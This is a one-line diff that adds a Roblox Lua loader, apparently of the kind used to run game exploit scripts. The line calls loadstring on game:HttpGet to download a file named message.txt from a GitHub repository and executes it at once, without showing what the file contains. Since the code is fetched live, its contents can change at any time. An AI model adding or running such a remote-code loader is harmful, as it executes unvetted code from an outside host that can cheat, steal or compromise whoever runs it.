@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/loanma0209-maker/animated-octo-palm-tree/main/message.txt'))()
